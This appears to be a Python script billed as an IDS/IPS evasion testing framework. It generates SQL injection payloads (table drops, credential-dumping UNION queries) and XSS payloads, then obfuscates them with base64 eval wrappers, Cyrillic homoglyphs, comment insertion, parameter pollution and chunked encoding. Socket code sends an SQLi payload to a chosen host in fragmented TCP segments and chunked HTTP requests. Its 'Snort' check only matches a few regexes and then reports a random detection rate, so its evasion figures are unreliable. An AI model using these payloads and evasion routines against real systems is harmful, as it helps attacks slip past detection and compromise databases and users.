#!/usr/bin/env python3
import base64
import random
import string
import hashlib
import struct
import socket
import time
from typing import List, Dict, Optional
from dataclasses import dataclass
import urllib.parse
import zlib
import codecs

@dataclass
class EvasionPayload:
    name: str
    description: str
    original_payload: str
    evaded_payload: str
    technique: str
    success: Optional[bool] = None

class IDSEvasionFramework:
    def __init__(self):
        self.evasion_techniques = [
            'base64_encoding',
            'hex_encoding',
            'unicode_obfuscation',
            'case_manipulation',
            'whitespace_obfuscation',
            'comment_insertion',
            'string_fragmentation',
            'parameter_pollution',
            'chunked_encoding',
            'packet_fragmentation'
        ]
    
    def generate_sql_injection_payloads(self) -> List[str]:
        """Generate common SQL injection payloads for testing"""
        payloads = [
            # Basic SQLi
            "' OR '1'='1' --",
            "' UNION SELECT 1,2,3 --",
            "'; DROP TABLE users --",
            
            # Time-based blind SQLi
            "' AND SLEEP(5) --",
            "' WAITFOR DELAY '00:00:05' --",
            
            # Error-based SQLi
            "' AND 1=CONVERT(int, (SELECT @@version)) --",
            
            # Union-based SQLi
            "' UNION SELECT username, password FROM users --",
            
            # Boolean-based blind SQLi
            "' AND SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1)='a' --"
        ]
        return payloads
    
    def generate_xss_payloads(self) -> List[str]:
        """Generate XSS payloads for testing"""
        payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            
            # Event handler XSS
            "\" onmouseover=\"alert(1)",
            "' onfocus='alert(1)",
            
            # JavaScript URI
            "javascript:alert(1)",
            
            # Data URI
            "data:text/html,<script>alert(1)</script>",
            
            # CSS expression (IE)
            "expression(alert(1))"
        ]
        return payloads
    
    def base64_evasion(self, payload: str) -> str:
        """Encode payload in Base64"""
        encoded = base64.b64encode(payload.encode()).decode()
        return f"eval(base64_decode('{encoded}'))"
    
    def hex_evasion(self, payload: str) -> str:
        """Encode payload in hexadecimal"""
        hex_encoded = payload.encode().hex()
        return f"exec(hex2bin('{hex_encoded}'))"
    
    def unicode_obfuscation(self, payload: str) -> str:
        """Obfuscate using Unicode characters"""
        obfuscated = ""
        for char in payload:
            if char.isalpha():
                # Replace with similar-looking Unicode characters
                if char.lower() == 'a':
                    obfuscated += 'а'  # Cyrillic 'a'
                elif char.lower() == 'e':
                    obfuscated += 'е'  # Cyrillic 'e'
                elif char.lower() == 'o':
                    obfuscated += 'о'  # Cyrillic 'o'
                else:
                    obfuscated += char
            else:
                obfuscated += char
        return obfuscated
    
    def case_manipulation(self, payload: str) -> str:
        """Randomize case of characters"""
        manipulated = ""
        for char in payload:
            if random.random() > 0.5:
                manipulated += char.upper()
            else:
                manipulated += char.lower()
        return manipulated
    
    def whitespace_obfuscation(self, payload: str) -> str:
        """Insert random whitespace"""
        obfuscated = ""
        for char in payload:
            obfuscated += char
            if random.random() < 0.3:  # 30% chance to insert whitespace
                obfuscated += random.choice(['\t', '\n', '\r', ' '])
        return obfuscated
    
    def comment_insertion(self, payload: str) -> str:
        """Insert random comments"""
        if payload.startswith("'") and payload.endswith("--"):
            # SQL injection payload
            parts = payload.split()
            if len(parts) > 2:
                insert_pos = random.randint(1, len(parts) - 2)
                parts.insert(insert_pos, "/*" + ''.join(random.choices(string.ascii_letters, k=5)) + "*/")
                return ' '.join(parts)
        return payload
    
    def string_fragmentation(self, payload: str) -> str:
        """Fragment string and concatenate"""
        if len(payload) < 5:
            return payload
        
        fragment_size = random.randint(2, max(2, len(payload) // 3))
        fragments = []
        
        for i in range(0, len(payload), fragment_size):
            fragment = payload[i:i + fragment_size]
            fragments.append(f"'{fragment}'")
        
        if len(fragments) > 1:
            return ' + '.join(fragments)
        else:
            return payload
    
    def http_parameter_pollution(self, payload: str) -> str:
        """Use HTTP parameter pollution"""
        param_name = 'id'
        polluted = f"{param_name}={payload}&{param_name}=legitimate_value"
        return polluted
    
    def chunked_encoding_evasion(self, payload: str) -> str:
        """Simulate chunked encoding evasion"""
        # Split payload into chunks
        chunk_size = random.randint(5, 20)
        chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
        
        chunked_payload = ""
        for chunk in chunks:
            chunk_len = hex(len(chunk))[2:]
            chunked_payload += f"{chunk_len}\r\n{chunk}\r\n"
        
        chunked_payload += "0\r\n\r\n"
        return chunked_payload
    
    def generate_evasion_payloads(self, original_payload: str) -> List[EvasionPayload]:
        """Generate multiple evaded versions of a payload"""
        evasions = []
        
        techniques = {
            'base64_encoding': self.base64_evasion,
            'hex_encoding': self.hex_evasion,
            'unicode_obfuscation': self.unicode_obfuscation,
            'case_manipulation': self.case_manipulation,
            'whitespace_obfuscation': self.whitespace_obfuscation,
            'comment_insertion': self.comment_insertion,
            'string_fragmentation': self.string_fragmentation,
            'parameter_pollution': self.http_parameter_pollution,
            'chunked_encoding': self.chunked_encoding_evasion
        }
        
        for technique_name, technique_func in techniques.items():
            try:
                evaded = technique_func(original_payload)
                evasion = EvasionPayload(
                    name=f"{technique_name}_evasion",
                    description=f"Payload evaded using {technique_name}",
                    original_payload=original_payload,
                    evaded_payload=evaded,
                    technique=technique_name
                )
                evasions.append(evasion)
            except Exception as e:
                print(f"Error applying {technique_name}: {e}")
        
        return evasions
    
    def simulate_packet_fragmentation(self, payload: str, protocol: str = 'tcp') -> List[bytes]:
        """Simulate packet fragmentation attack"""
        if protocol == 'tcp':
            return self._tcp_fragmentation(payload)
        elif protocol == 'udp':
            return self._udp_fragmentation(payload)
        else:
            return [payload.encode()]
    
    def _tcp_fragmentation(self, payload: str) -> List[bytes]:
        """Fragment payload for TCP evasion"""
        fragments = []
        payload_bytes = payload.encode()
        
        # Fragment into smaller packets
        fragment_size = random.randint(8, 64)
        for i in range(0, len(payload_bytes), fragment_size):
            fragment = payload_bytes[i:i + fragment_size]
            fragments.append(fragment)
            
            # Add small random delay between fragments
            time.sleep(random.uniform(0.01, 0.1))
        
        return fragments
    
    def _udp_fragmentation(self, payload: str) -> List[bytes]:
        """Fragment payload for UDP evasion"""
        fragments = []
        payload_bytes = payload.encode()
        
        # UDP typically has smaller MTU
        fragment_size = random.randint(4, 32)
        for i in range(0, len(payload_bytes), fragment_size):
            fragment = payload_bytes[i:i + fragment_size]
            fragments.append(fragment)
        
        return fragments
    
    def test_evasion_against_snort(self, payloads: List[EvasionPayload]) -> Dict[str, List[EvasionPayload]]:
        """Simulate testing against Snort-like IDS (simulated)"""
        print("[*] Simulating IDS evasion testing...")
        
        results = {
            'detected': [],
            'evaded': []
        }
        
        for payload in payloads:
            # Simulate detection logic
            detected = self._simulate_snort_detection(payload.evaded_payload)
            payload.success = not detected
            
            if detected:
                results['detected'].append(payload)
            else:
                results['evaded'].append(payload)
        
        return results
    
    def _simulate_snort_detection(self, payload: str) -> bool:
        """Simulate Snort rule detection (simplified)"""
        # Common Snort rule patterns
        snort_patterns = [
            r"union.*select",
            r"script.*alert",
            r"drop.*table",
            r"or.*1.*=.*1",
            r"xss",
            r"sql.*injection"
        ]
        
        import re
        payload_lower = payload.lower()
        
        for pattern in snort_patterns:
            if re.search(pattern, payload_lower, re.IGNORECASE):
                # Some evasion techniques might still be detected
                evasion_effectiveness = random.random()
                return evasion_effectiveness < 0.3  # 30% detection rate for evaded payloads
        
        return False
    
    def generate_evasion_report(self, test_results: Dict[str, List[EvasionPayload]]) -> str:
        """Generate comprehensive evasion test report"""
        report = "=== IDS/IPS EVASION TEST REPORT ===\n\n"
        
        total_payloads = len(test_results['detected']) + len(test_results['evaded'])
        evasion_rate = (len(test_results['evaded']) / total_payloads * 100) if total_payloads > 0 else 0
        
        report += f"Total Payloads Tested: {total_payloads}\n"
        report += f"Successfully Evaded: {len(test_results['evaded'])}\n"
        report += f"Detected: {len(test_results['detected'])}\n"
        report += f"Evasion Success Rate: {evasion_rate:.1f}%\n\n"
        
        report += "SUCCESSFUL EVASIONS:\n"
        report += "-" * 50 + "\n"
        for payload in test_results['evaded']:
            report += f"Technique: {payload.technique}\n"
            report += f"Original: {payload.original_payload}\n"
            report += f"Evaded: {payload.evaded_payload}\n"
            report += "-" * 30 + "\n"
        
        report += "\nDETECTED PAYLOADS:\n"
        report += "-" * 50 + "\n"
        for payload in test_results['detected']:
            report += f"Technique: {payload.technique}\n"
            report += f"Payload: {payload.evaded_payload}\n"
            report += "-" * 30 + "\n"
        
        return report

class NetworkEvasionTests:
    """Network-level evasion techniques"""
    
    @staticmethod
    def tcp_segment_evasion(host: str, port: int, payload: str):
        """Send TCP segments with evasion techniques"""
        print(f"[*] Testing TCP segmentation evasion against {host}:{port}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            # Send payload in small segments with delays
            payload_bytes = payload.encode()
            segment_size = 8  # Very small segments
            
            for i in range(0, len(payload_bytes), segment_size):
                segment = payload_bytes[i:i + segment_size]
                sock.send(segment)
                time.sleep(0.1)  # Small delay between segments
            
            sock.close()
            return True
        except Exception as e:
            print(f"[-] TCP evasion failed: {e}")
            return False
    
    @staticmethod
    def http_chunked_evasion(host: str, port: int, payload: str):
        """Test HTTP chunked transfer encoding evasion"""
        print(f"[*] Testing HTTP chunked encoding evasion against {host}:{port}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            # Craft HTTP request with chunked encoding
            request = f"POST /test HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            request += "Transfer-Encoding: chunked\r\n"
            request += "Content-Type: application/x-www-form-urlencoded\r\n"
            request += "\r\n"
            
            # Send request headers
            sock.send(request.encode())
            
            # Send payload in chunks
            chunks = [payload[i:i+10] for i in range(0, len(payload), 10)]
            for chunk in chunks:
                chunk_size = hex(len(chunk))[2:]
                sock.send(f"{chunk_size}\r\n{chunk}\r\n".encode())
                time.sleep(0.05)
            
            # End chunked transfer
            sock.send(b"0\r\n\r\n")
            
            sock.close()
            return True
        except Exception as e:
            print(f"[-] HTTP chunked evasion failed: {e}")
            return False

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="IDS/IPS Evasion Testing Framework")
    parser.add_argument("--test-type", choices=['sql', 'xss', 'all'], default='all',
                       help="Type of payloads to test")
    parser.add_argument("--target-host", help="Target host for network tests")
    parser.add_argument("--target-port", type=int, help="Target port for network tests")
    parser.add_argument("--output", help="Output file for report")
    
    args = parser.parse_args()
    
    framework = IDSEvasionFramework()
    network_tester = NetworkEvasionTests()
    
    # Generate test payloads
    all_payloads = []
    
    if args.test_type in ['sql', 'all']:
        sql_payloads = framework.generate_sql_injection_payloads()
        for payload in sql_payloads:
            all_payloads.extend(framework.generate_evasion_payloads(payload))
    
    if args.test_type in ['xss', 'all']:
        xss_payloads = framework.generate_xss_payloads()
        for payload in xss_payloads:
            all_payloads.extend(framework.generate_evasion_payloads(payload))
    
    print(f"[*] Generated {len(all_payloads)} evasion payloads")
    
    # Test evasion effectiveness
    test_results = framework.test_evasion_against_snort(all_payloads)
    
    # Generate report
    report = framework.generate_evasion_report(test_results)
    print(report)
    
    # Save report if output specified
    if args.output:
        with open(args.output, 'w') as f:
            f.write(report)
        print(f"[+] Report saved to {args.output}")
    
    # Run network tests if target specified
    if args.target_host and args.target_port:
        print(f"\n[*] Running network evasion tests against {args.target_host}:{args.target_port}")
        
        # Test with a sample payload
        sample_payload = "' OR '1'='1' --"
        
        # TCP segmentation test
        tcp_success = network_tester.tcp_segment_evasion(
            args.target_host, args.target_port, sample_payload
        )
        
        # HTTP chunked encoding test
        http_success = network_tester.http_chunked_evasion(
            args.target_host, args.target_port, sample_payload
        )
        
        print(f"\nNetwork Test Results:")
        print(f"TCP Segmentation: {'SUCCESS' if tcp_success else 'FAILED'}")
        print(f"HTTP Chunked: {'SUCCESS' if http_success else 'FAILED'}")

if __name__ == "__main__":
    main()
